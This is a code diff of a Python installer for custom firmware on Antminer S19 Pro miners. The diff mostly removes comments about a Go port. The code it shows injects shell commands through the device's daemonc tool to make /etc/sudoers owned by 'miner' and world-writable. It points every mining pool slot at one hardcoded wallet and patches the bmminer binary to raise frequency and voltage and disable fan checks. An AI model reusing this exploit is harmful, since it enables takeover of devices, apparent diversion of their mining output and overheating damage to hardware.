@@ -22,7 +22,7 @@ HASHSOURCE_VERSION = "0.1.2"
 POOL_URL = "stratum+tcp://mine.ocean.xyz:3334"
 POOL_WALLET = "1GRfspGGx4Ne66YotWuosUc4WeJLfGE3dZ"
 
-# Binary patch offsets - matching Go implementation exactly
+# Binary patch offsets
 PATCH_OFFSETS = {
     "frequency1": 0x24F58,
     "frequency2": 0x24A20,
@@ -93,13 +93,13 @@ class HashSourceInstaller:
         if not self.device_info:
             return False
 
-        # Check if already running HashSource (matching Go's IsDeviceZettaX)
+        # Check if already running HashSource
         firmware_type = self.device_info.get("firmware_type", "")
-        if firmware_type == "HashSource" or firmware_type == "ZettaX":
+        if firmware_type == "HashSource":
             print(f"[{self.host}] Already running custom firmware: {firmware_type}")
             return False
 
-        # Check model compatibility (matching Go's IsDeviceModelSupported)
+        # Check model compatibility
         miner_type = self.device_info.get("minertype", "")
         if miner_type != "Antminer S19 Pro":
             print(f"[{self.host}] Unsupported model: {miner_type}")
@@ -108,8 +108,8 @@ class HashSourceInstaller:
         return True
 
     def gain_sudo_access(self) -> bool:
-        """Gain sudo access on the device - matching Go's SuperuserAccess"""
-        # Check if already has sudo (matching Go's HasSudoAccess)
+        """Gain sudo access on the device"""
+        # Check if already has sudo
         success, output = self.run_command("echo 'miner' | sudo --stdin -l -U miner")
         if success and "miner may run the following commands on" in output:
             print(f"[{self.host}] Already has sudo access")
@@ -117,7 +117,7 @@ class HashSourceInstaller:
 
         print(f"[{self.host}] Gaining sudo access...")
 
-        # Exploit daemonc to modify sudoers - exact sequence from Go
+        # Exploit daemonc to modify sudoers
         commands = [
             "daemonc \\;chown\\ miner\\ /etc/sudoers",
             "daemonc \\;chmod\\ 777\\ /etc/sudoers",
@@ -135,13 +135,13 @@ class HashSourceInstaller:
         return True
 
     def configure_pools(self) -> bool:
-        """Configure mining pools - matching Go implementation"""
+        """Configure mining pools"""
         if not self.device_info:
             return False
 
         mac_address = self.device_info.get("macaddr", "").replace(":", "")
 
-        # Pool configuration matching Go's SetMinerConf call
+        # Pool configuration
         pool_config: Dict[str, Any] = {
             "bitmain-fan-ctrl": False,
             "bitmain-fan-pwm": "100",
@@ -150,7 +150,7 @@ class HashSourceInstaller:
             "pools": [
                 {"url": POOL_URL, "user": f"{POOL_WALLET}.{mac_address}", "pass": ""}
             ]
-            * 3,  # Same pool 3 times as in Go
+            * 3,  # Same pool 3 times
         }
 
         try:
@@ -164,7 +164,7 @@ class HashSourceInstaller:
             return False
 
     def prepare_system(self) -> bool:
-        """Prepare system for HashSource installation - matching Go's PrepareMachine"""
+        """Prepare system for HashSource installation"""
         print(f"[{self.host}] Preparing system...")
 
         commands = [
@@ -195,7 +195,7 @@ class HashSourceInstaller:
             # Initialize Keystone assembler for ARM
             ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
 
-            # Generate the MOV instruction - matching Go's getArmOpcodes
+            # Generate the MOV instruction
             arm_code = f"mov {register}, #{value}"
 
             # Assemble the instruction
@@ -240,7 +240,7 @@ class HashSourceInstaller:
     def patch_bmminer(
         self, frequency: int = DEFAULT_FREQUENCY, voltage: int = DEFAULT_VOLTAGE
     ) -> Optional[bytes]:
-        """Patch bmminer binary with custom frequency and voltage - matching Go's PatchBmminer"""
+        """Patch bmminer binary with custom frequency and voltage"""
         bmminer_path = "bmminer_no_fan_check"
 
         if not os.path.exists(bmminer_path):
@@ -252,11 +252,11 @@ class HashSourceInstaller:
         with open(bmminer_path, "rb") as f:
             bmminer_data = bytearray(f.read())
 
-        # Generate opcodes - matching Go's getArmOpcodes calls
+        # Generate opcodes
         freq_opcode = self.generate_arm_opcode(frequency, "r2")
         volt_opcode = self.generate_arm_opcode(voltage, "r0")
 
-        # Apply patches at exact offsets from Go
+        # Apply patches
         # Frequency patches
         bmminer_data[PATCH_OFFSETS["frequency1"] : PATCH_OFFSETS["frequency1"] + 4] = (
             freq_opcode
@@ -273,7 +273,7 @@ class HashSourceInstaller:
             volt_opcode
         )
 
-        # Disable fan checks - matching Go's patch calls
+        # Disable fan checks
         bmminer_data[PATCH_OFFSETS["disable_fans1"]] = 0x00
         bmminer_data[PATCH_OFFSETS["disable_fans2"] + 3] = 0xEB
 
@@ -286,7 +286,7 @@ class HashSourceInstaller:
         return bytes(bmminer_data)
 
     def upload_bmminer(self, bmminer_data: bytes) -> bool:
-        """Upload patched bmminer to device - matching Go's SendUpdateFile"""
+        """Upload patched bmminer to device"""
         print(f"[{self.host}] Uploading patched bmminer...")
 
         try:
@@ -303,7 +303,7 @@ class HashSourceInstaller:
             return False
 
     def install_bmminer(self) -> bool:
-        """Install uploaded bmminer - matching Go's BmminerUpdate"""
+        """Install uploaded bmminer"""
         print(f"[{self.host}] Installing bmminer...")
 
         commands = [
@@ -321,7 +321,7 @@ class HashSourceInstaller:
         return True
 
     def restart_bmminer(self) -> bool:
-        """Restart bmminer service - matching Go's BmminerRestart"""
+        """Restart bmminer service"""
         print(f"[{self.host}] Restarting bmminer...")
         success, _ = self.run_command("sudo /etc/init.d/S70cgminer restart")
         return success
@@ -329,7 +329,7 @@ class HashSourceInstaller:
     def install(
         self, frequency: int = DEFAULT_FREQUENCY, voltage: int = DEFAULT_VOLTAGE
     ) -> bool:
-        """Main installation process - matching Go's InstallZettaX workflow"""
+        """Main installation process"""
         mac_address = "Unknown"
 
         try:
